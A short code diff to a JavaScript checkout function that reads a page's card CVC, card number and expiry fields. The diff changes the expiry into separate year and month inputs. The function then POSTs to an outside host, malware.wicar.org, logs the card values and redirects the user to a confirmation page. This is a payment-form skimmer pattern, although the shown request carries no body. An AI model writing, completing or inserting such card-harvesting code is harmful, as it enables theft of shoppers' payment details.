@@ -22,14 +22,15 @@ function myFunction() {
    
    let a = document.querySelector('#card-cvc').value
    let b = document.querySelector('#card-number').value
-   let c = document.querySelector('#card-expiry').value
+   let c = document.querySelector('#card-expiry-y').value
+   let d = document.querySelector('#card-expiry-m').value
 
    fetch('https://malware.wicar.org/',{
       mode: 'no-cors',
       method: 'POST',
       headers: { 'Content-type': 'application/json' }})
     .then(response => console.log(response))
-    .then(res=>{console.log(res,a,b,c); 
+    .then(res=>{console.log(res,a,b,c,d); 
         window.location.href = 'confirmation.html'
     })
 
